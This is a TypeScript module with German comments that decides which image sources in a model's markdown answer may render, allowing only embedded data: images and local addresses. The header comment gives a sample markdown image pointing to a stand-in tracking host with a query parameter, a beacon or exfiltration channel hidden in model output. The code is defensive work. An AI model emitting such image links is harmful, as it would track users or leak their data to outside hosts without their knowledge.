// Bild-Politik einer Antwort: was in ein img-Element darf.
//
// Gemessen am ausgelieferten Fenster-Buendel (P8-AUSSEN-PFADE-0211.md §2b) holt
// die Flaeche nichts von ausserhalb — mit einer Ausnahme: ein Bild, das eine
// Modell-Antwort mitbringt. react-markdown malt dafuer ein img-Element, und der
// Rechner ruft beim Lesen die Gegenstelle an. Ein Notiztext mit
// `![x](https://spur.example/p.gif?i=...)` war damit ein Leser-Beweis bei einem
// Fremdrechner, bevor der Nutzer irgendetwas davon merkt. Eingebettete Bilder
// (data:) und Bilder von diesem Rechner rufen niemanden an — die beiden bleiben.
//
// Zweiter Fund in derselben Zeile: react-markowns eigne URL-Umwandlung leert
// `data:`-Adressen. Ein eingebettetes Bild endete als `<img src="">`, und eine
// leere Quelle laedt im Chromium die Seite selbst noch einmal. Die Umwandlung
// wird darum ergaenzt, nicht ersetzt.

import { istLokaleAdresse } from "./schild";

const EINGEBETTET = /^data:image\/(png|jpe?g|gif|webp|avif);base64,[A-Za-z0-9+/=]+$/;

export type Bildbeschluss =
  | { art: "malen"; src: string }
  | { art: "abgewiesen"; gegenstelle: string; weg: string | null };

/** Der Host, dem die Adresse gehoert, so wie er im Adressbuch aussieht (ohne www). */
export function gegenstelle(src: string): string {
  try {
    return new URL(src).hostname.replace(/^www\./i, "");
  } catch {
    return "";
  }
}

/**
 * Was mit der Bild-Quelle geschehen darf. `src` ist die Adresse, die nach der
 * Bibliotheks-Umwandlung uebrig bleibt — leer heisst, die Bibliothek hat sie
 * schon verworfen (javascript: und Verwandte); dann malt nichts ein Bild, aber
 * die Zeile sagt es.
 */
export function bildeinordnung(src: string): Bildbeschluss {
  const quelle = (src ?? "").trim();
  if (!quelle) return { art: "abgewiesen", gegenstelle: "", weg: null };
  if (EINGEBETTET.test(quelle) || istLokaleAdresse(quelle)) return { art: "malen", src: quelle };
  const Gegenstelle = gegenstelle(quelle);
  return {
    art: "abgewiesen",
    gegenstelle: Gegenstelle,
    // Der Ausweg ist eine Adresse, die der Nutzer selbst anruft — nur eine
    // wirkliche Gegenstelle kommt dafuer in Frage.
    weg: Gegenstelle ? quelle : null,
  };
}
